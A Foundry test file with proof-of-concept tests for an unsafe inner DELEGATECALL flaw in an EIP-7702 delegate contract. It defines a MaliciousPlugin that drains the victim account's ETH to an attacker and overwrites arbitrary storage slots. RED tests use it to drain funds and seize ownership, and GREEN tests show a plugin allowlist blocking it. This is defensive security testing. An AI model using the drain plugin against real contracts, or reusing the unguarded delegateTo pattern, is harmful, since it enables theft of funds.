// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC05_InnerDelegatecallDelegate.sol";
import "../src/fixed/DC05_SafePluginDelegate.sol";

/**
 * @title DC05_InnerDelegatecallTest
 * @notice PoC tests for DC-05: Unsafe inner DELEGATECALL
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *
 * The attack: an attacker deploys a "malicious plugin" contract,
 * then tricks or coerces the victim into calling executePlugin(maliciousPlugin, ...)
 * The malicious plugin runs in the EOA's storage context and drains all assets.
 */

// Malicious plugin contract deployed by the attacker
// When delegatecalled, it runs in the EOA's context and drains ETH
contract MaliciousPlugin {
    /**
     * @notice Drain all ETH to the attacker.
     * @dev This runs via delegatecall in the EOA's context.
     *      address(this) == the victim EOA, so address(this).balance is the EOA's ETH.
     */
    function drain(address payable attacker) external {
        (bool ok,) = attacker.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }

    /**
     * @notice Corrupt storage at an arbitrary slot.
     * @dev Demonstrates that inner delegatecall can write to any storage slot.
     */
    function corruptSlot(bytes32 slot, bytes32 value) external {
        assembly { sstore(slot, value) }
    }
}

// Legitimate plugin - does something benign
contract LegitimatePlugin {
    function doSomethingUseful(uint256 x) external pure returns (uint256) {
        return x * 2;
    }
}

contract DC05_InnerDelegatecallTest is Test {
    address payable public victimEOA;
    address public attacker;

    DC05_InnerDelegatecallDelegate public vulnDelegate;
    DC05_SafePluginDelegate        public safeDelegate;

    MaliciousPlugin   public malPlugin;
    LegitimatePlugin  public legitPlugin;

    function setUp() public {
        victimEOA = payable(makeAddr("victimEOA"));
        attacker  = makeAddr("attacker");

        vm.deal(victimEOA, 5 ether);

        vulnDelegate = new DC05_InnerDelegatecallDelegate();
        safeDelegate = new DC05_SafePluginDelegate();
        malPlugin    = new MaliciousPlugin();
        legitPlugin  = new LegitimatePlugin();
    }

    // =========================================================================
    // RED TESTS - unconstrained inner DELEGATECALL
    // =========================================================================

    /**
     * @notice RED: Attacker's plugin drains EOA via inner DELEGATECALL
     *
     * The vulnerable executePlugin() is owner-gated, but the attacker here
     * is demonstrating what happens if they trick the owner into calling it
     * (social engineering, phishing TX, etc.) OR via the unguarded delegateTo().
     */
    function test_RED_MaliciousPluginDrainsETH() public {
        console.log("=== DC-05 INNER DELEGATECALL EXPLOIT ===");

        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC05_InnerDelegatecallDelegate(victimEOA).initialize(victimEOA);

        uint256 victimBefore   = victimEOA.balance;
        uint256 attackerBefore = attacker.balance;
        console.log("Victim ETH before:", victimBefore / 1e18, "ETH");

        // Attacker tricks victim into calling executePlugin(malPlugin, drainCalldata)
        // OR attacker uses the unguarded delegateTo() directly
        vm.prank(attacker);
        DC05_InnerDelegatecallDelegate(victimEOA).delegateTo(
            address(malPlugin),
            abi.encodeWithSelector(MaliciousPlugin.drain.selector, attacker)
        );

        console.log("Victim ETH after:", victimEOA.balance / 1e18, "ETH");
        console.log("Attacker ETH gained:", (attacker.balance - attackerBefore) / 1e18, "ETH");

        assertEq(victimEOA.balance, 0, "EOA fully drained via inner delegatecall");
        assertEq(attacker.balance - attackerBefore, victimBefore, "Attacker has all ETH");
    }

    /**
     * @notice RED: Malicious plugin corrupts arbitrary storage slots
     *
     * Shows that inner delegatecall gives write access to ALL of the EOA's
     * storage, not just the delegate's namespaced slots.
     */
    function test_RED_MaliciousPluginCorruptsStorage() public {
        console.log("=== DC-05 STORAGE CORRUPTION VIA INNER DELEGATECALL ===");

        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC05_InnerDelegatecallDelegate(victimEOA).initialize(victimEOA);

        // Attacker targets the delegate's ERC-7201 storage slot
        bytes32 targetSlot = keccak256(
            abi.encode(uint256(keccak256("delegateguard.dc05.vulnerable")) - 1)
        ) & ~bytes32(uint256(0xff));

        // Owner slot is at targetSlot (first field in struct)
        // Attacker will overwrite it with their own address
        bytes32 attackerAsBytes32 = bytes32(uint256(uint160(attacker)));

        // Via delegateTo (no auth check)
        vm.prank(attacker);
        DC05_InnerDelegatecallDelegate(victimEOA).delegateTo(
            address(malPlugin),
            abi.encodeWithSelector(MaliciousPlugin.corruptSlot.selector, targetSlot, attackerAsBytes32)
        );

        // Now attacker IS the owner of the delegate
        // (The storage corruption changed the owner field)
        bytes32 storedOwner = vm.load(victimEOA, targetSlot);
        address newOwner = address(uint160(uint256(storedOwner)));
        console.log("Owner after storage corruption:", newOwner);
        console.log("Attacker address:", attacker);
        assertEq(newOwner, attacker, "CRITICAL: storage corrupted, attacker is now owner");
    }

    /**
     * @notice RED: Even owner-gated executePlugin() is dangerous with unconstrained target
     *
     * If the owner is tricked into calling executePlugin(malPlugin, ...),
     * the result is the same - EOA drained.
     */
    function test_RED_OwnerTrickedIntoMaliciousPlugin() public {
        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC05_InnerDelegatecallDelegate(victimEOA).initialize(victimEOA);

        uint256 attackerBefore = attacker.balance;

        // Owner is tricked (via phishing UI) into calling executePlugin with malPlugin
        vm.prank(victimEOA);
        DC05_InnerDelegatecallDelegate(victimEOA).executePlugin(
            address(malPlugin),
            abi.encodeWithSelector(MaliciousPlugin.drain.selector, attacker)
        );

        assertEq(victimEOA.balance, 0, "EOA drained even via owner-gated path");
        assertGt(attacker.balance, attackerBefore, "Attacker profited");
        console.log("Owner-gated path still dangerous without plugin allowlist");
    }

    // =========================================================================
    // GREEN TESTS - plugin allowlist blocks malicious plugins
    // =========================================================================

    /**
     * @notice GREEN: Malicious plugin CANNOT be called via safe delegate
     */
    function test_GREEN_MaliciousPluginBlocked() public {
        console.log("=== DC-05 FIXED: Plugin Allowlist ===");

        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC05_SafePluginDelegate(victimEOA).initialize(victimEOA);

        // Owner tries to call a non-allowlisted plugin (could be a mistake or phishing)
        vm.prank(victimEOA);
        vm.expectRevert("DC05: plugin not allowed");
        DC05_SafePluginDelegate(victimEOA).executePlugin(
            address(malPlugin),
            abi.encodeWithSelector(MaliciousPlugin.drain.selector, attacker)
        );

        assertEq(victimEOA.balance, 5 ether, "EOA funds safe - malicious plugin blocked");
        console.log("Malicious plugin blocked. Victim ETH safe:", victimEOA.balance / 1e18, "ETH");
    }

    /**
     * @notice GREEN: Allowlisted legitimate plugin CAN be called
     */
    function test_GREEN_LegitPluginWorksWhenAllowed() public {
        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC05_SafePluginDelegate(victimEOA).initialize(victimEOA);

        // Owner adds legitimate plugin to allowlist
        vm.prank(victimEOA);
        DC05_SafePluginDelegate(victimEOA).allowPlugin(address(legitPlugin));

        assertTrue(DC05_SafePluginDelegate(victimEOA).isPluginAllowed(address(legitPlugin)), "Plugin is allowed");

        // Owner executes the legitimate plugin
        vm.prank(victimEOA);
        bytes memory result = DC05_SafePluginDelegate(victimEOA).executePlugin(
            address(legitPlugin),
            abi.encodeWithSelector(LegitimatePlugin.doSomethingUseful.selector, uint256(21))
        );

        uint256 returnVal = abi.decode(result, (uint256));
        assertEq(returnVal, 42, "Legitimate plugin returns correct result");
        assertEq(victimEOA.balance, 5 ether, "No ETH lost during legitimate plugin call");
        console.log("=== Legitimate plugin executed safely, funds untouched ===");
    }

    /**
     * @notice GREEN: Non-owner CANNOT call executePlugin even for allowlisted plugins
     */
    function test_GREEN_OnlyOwnerCanExecutePlugin() public {
        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC05_SafePluginDelegate(victimEOA).initialize(victimEOA);

        // Owner allows the legitimate plugin
        vm.prank(victimEOA);
        DC05_SafePluginDelegate(victimEOA).allowPlugin(address(legitPlugin));

        // Attacker tries to call even an allowlisted plugin - blocked by onlyOwner
        vm.prank(attacker);
        vm.expectRevert("DC05: not owner");
        DC05_SafePluginDelegate(victimEOA).executePlugin(
            address(legitPlugin),
            abi.encodeWithSelector(LegitimatePlugin.doSomethingUseful.selector, uint256(1))
        );
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }
}
